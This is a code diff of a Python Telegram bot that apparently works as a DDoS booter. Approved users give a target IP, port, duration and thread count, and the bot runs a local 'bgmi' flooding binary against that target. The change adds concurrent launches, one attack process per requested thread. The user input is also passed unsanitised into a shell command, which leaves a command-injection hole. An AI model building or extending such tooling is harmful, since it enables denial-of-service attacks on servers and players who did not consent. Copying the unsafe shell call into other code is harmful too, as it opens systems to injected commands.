@@ -22,15 +22,6 @@ def save_approved_users(approved_users):
 
 approved_users = load_approved_users()  # Load approved user IDs at startup
 
-# Write attack parameters to external file ./bgmi
-def write_attack_parameters(ip, port, duration, threads):
-    with open('./bgmi', 'w') as file:
-        file.write(f"IP: {ip}\n")
-        file.write(f"Port: {port}\n")
-        file.write(f"Duration: {duration}\n")
-        file.write(f"Threads: {threads}\n")
-    print(f"Parameters written to ./bgmi: IP={ip}, Port={port}, Duration={duration}, Threads={threads}")
-
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
@@ -40,23 +31,19 @@ async def start(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, threads, context):
+async def run_attack(chat_id, ip, port, duration, context, thread_number):
     try:
-        # Write the parameters to the external file
-        write_attack_parameters(ip, port, duration, threads)
-        
-        # Run the attack (simulate with a shell command or actual logic)
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration} {threads}",
+            f"./bgmi {ip} {port} {duration} {thread_number}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
         stdout, stderr = await process.communicate()
 
         if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
+            print(f"[stdout] {stdout.decode()}")
         if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+            print(f"[stderr] {stderr.decode()}")
 
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
@@ -78,15 +65,31 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     ip, port, duration, threads = args
-    await context.bot.send_message(chat_id=chat_id, text=( 
+
+    # Validate threads argument
+    try:
+        threads = int(threads)
+        if threads <= 0:
+            raise ValueError("Threads must be a positive integer.")
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid positive integer for threads.*", parse_mode='Markdown')
+        return
+
+    await context.bot.send_message(chat_id=chat_id, text=(
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*💻 Threads: {threads}*\n"
+        f"*💥 Threads: {threads}*\n"
         f"*🔥 Let the battlefield ignite! 💥*"
     ), parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))
+    # Create a list of tasks to run the attack on multiple threads
+    tasks = []
+    for i in range(threads):
+        tasks.append(run_attack(chat_id, ip, port, duration, context, i + 1))  # Pass thread number to differentiate them
+
+    # Run all tasks concurrently
+    await asyncio.gather(*tasks)
 
 async def approve_user(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
